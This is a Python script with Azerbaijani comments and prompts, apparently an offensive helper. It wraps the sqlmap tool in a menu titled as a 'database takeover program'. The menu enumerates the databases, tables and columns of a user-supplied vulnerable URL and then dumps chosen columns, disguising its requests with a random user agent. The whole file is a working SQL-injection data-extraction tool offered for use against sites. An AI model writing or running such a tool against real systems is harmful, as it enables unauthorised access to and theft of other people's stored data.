#!/usr/bin/env python
# -*- coding: utf-8 -*-

import os
import subprocess
import datetime

def run_command(command):
    """ Komut çalışdırır və nəticəni qaytarır. """
    try:
        result = subprocess.run(command, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
        if result.returncode != 0:
            return f"Komut çalışdırılarkən bir xəta baş verdi: {result.stderr}"
        return result.stdout
    except Exception as e:
        return f"Komut çalışdırıla bilmədi: {str(e)}"

def save_output(output, filename="output.txt"):
    """ Nəticəni fayla qeyd edir. """
    with open(filename, "a") as file:
        timestamp = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        file.write(f"--- {timestamp} ---\n{output}\n\n")

def security_scan():
    """ SQLi təhlükəsizlik açığı taraması edir. """
    aciklilink = input("Açıq linki daxil edin: ")
    result = run_command(["sqlmap", "-u", aciklilink, "--dbs", "--random-agent"])
    save_output(result)
    return result

def db_scan():
    """ Müəyyən verilənlər bazasını tarar. """
    aciklilink = input("Açıq linki daxil edin: ")
    veritabani = input("Verilənlər bazasının adını daxil edin: ")
    result = run_command(["sqlmap", "-u", aciklilink, "-D", veritabani, "--tables", "--random-agent"])
    save_output(result)
    return result

def table_scan():
    """ Verilənlər bazası və cədvəli tarar. """
    aciklilink = input("Açıq linki daxil edin: ")
    veritabani = input("Verilənlər bazasının adını daxil edin: ")
    tablo = input("Cədvəl adını daxil edin: ")
    result = run_command(["sqlmap", "-u", aciklilink, "-D", veritabani, "-T", tablo, "--columns", "--random-agent"])
    save_output(result)
    return result

def column_scan():
    """ Müəyyən verilənlər bazası, cədvəl və kolonları tarar. """
    aciklilink = input("Açıq linki daxil edin: ")
    veritabani = input("Verilənlər bazasının adını daxil edin: ")
    tablo = input("Cədvəl adını daxil edin: ")
    kolon = input("Kolon adını daxil edin: ")
    result = run_command(["sqlmap", "-u", aciklilink, "-D", veritabani, "-T", tablo, "-C", kolon, "--dump", "--random-agent"])
    save_output(result)
    return result

def main():
    print("""
    Verilənlər Bazası Ele Keçirmə Proqramı

    1) Təhlükəsizlik Açığını Tara
    2) Verilənlər Bazası ilə Tara
    3) Verilənlər Bazası və Cədvəl ilə Tara
    4) Verilənlər Bazası və Cədvəl ilə Kolonları Tara
    """)

    islemno = input("İşlem nömrəsini daxil edin: ")

    if islemno == "1":
        print(security_scan())
    elif islemno == "2":
        print(db_scan())
    elif islemno == "3":
        print(table_scan())
    elif islemno == "4":
        print(column_scan())
    else:
        print("Yanlış düymə basdınız!")

if __name__ == "__main__":
    main()
